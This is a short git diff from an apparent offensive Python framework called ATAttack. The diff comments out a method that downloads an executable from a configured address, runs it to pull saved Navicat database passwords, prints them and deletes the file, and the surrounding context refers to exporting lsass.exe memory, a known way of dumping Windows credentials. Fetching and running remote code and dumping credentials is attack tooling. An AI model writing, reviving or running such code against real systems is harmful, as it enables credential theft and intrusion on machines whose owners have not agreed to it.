@@ -11,7 +11,6 @@ import ftplib
 
 from ATAttack.framework.prints import *
 from ATAttack.framework.constant import constant
-
 import os
 
 
@@ -123,14 +122,14 @@ class upload(object):
         except Exception:
             print_error("Export lsass.exe failed")
 
+    # def navicatpwd(self):
+    #
+    #     self.download(constant.Navicat, random_exe)
+    #     print_success("Successful Access to Navicat Password : ")
+    #     if os.path.getsize(random_exe) == 0:
+    #         os.remove(random_exe)
+    #     else:
+    #         print_success(os.popen(random_exe).read())
+    #         os.remove(random_exe)
 
-    def navicatpwd(self):
-
-        self.download(constant.Navicat, random_exe)
-        print_success("Successful Access to Navicat Password : ")
-        if os.path.getsize(random_exe) == 0:
-            os.remove(random_exe)
-        else:
-            print_success(os.popen(random_exe).read())
-            os.remove(random_exe)
 
